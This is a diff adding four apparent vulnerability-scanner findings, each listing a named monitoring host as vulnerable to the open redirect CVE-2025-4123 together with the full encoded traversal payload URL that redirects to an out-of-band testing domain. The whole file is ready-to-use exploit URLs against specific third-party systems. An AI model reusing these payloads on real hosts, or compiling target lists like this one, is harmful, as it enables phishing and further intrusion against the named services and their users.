@@ -1,0 +1,4 @@
+[CVE-2025-4123:open-redirect] [http] [high] https://metrics-api.irys.xyz/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://monitor.socket.tech/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://monitoring.bridge.alephium.org/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://monitoring.testnet.bridge.alephium.org/public/..%2F%5coast.pro%2F%3f%2F..%2F..
